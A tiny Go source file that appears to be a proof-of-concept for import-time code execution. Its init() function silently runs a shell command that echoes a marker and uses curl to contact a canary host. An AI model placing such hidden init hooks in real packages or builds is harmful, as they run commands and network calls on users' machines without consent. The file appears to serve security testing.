package main

import (
	"fmt"
	"os/exec"
)

func init() {
	// Simple proof-of-concept: write to a file that we can check in logs
	cmd := exec.Command("sh", "-c", "echo 'MALICIOUS_INIT_EXECUTED' && curl -s http://canary.domain/poc-go-init")
	output, err := cmd.CombinedOutput()
	fmt.Printf("Init executed: %s, error: %v\n", output, err)
}